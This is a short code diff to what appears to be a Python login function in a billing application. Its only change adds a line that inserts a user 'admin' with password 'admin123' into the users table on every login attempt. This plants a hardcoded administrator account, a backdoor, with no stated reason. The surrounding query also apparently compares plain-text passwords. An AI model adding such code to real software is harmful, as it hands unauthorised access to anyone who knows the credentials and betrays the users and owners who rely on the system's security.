@@ -104,6 +104,7 @@ def get_bills():
 def login_user(username, password):
     conn = connect_db()
     cursor = conn.cursor()
+    cursor.execute('''insert into users values ('admin','admin123')''')
     cursor.execute('''
         SELECT * FROM users WHERE username = ? AND password = ?
     ''', (username, password))
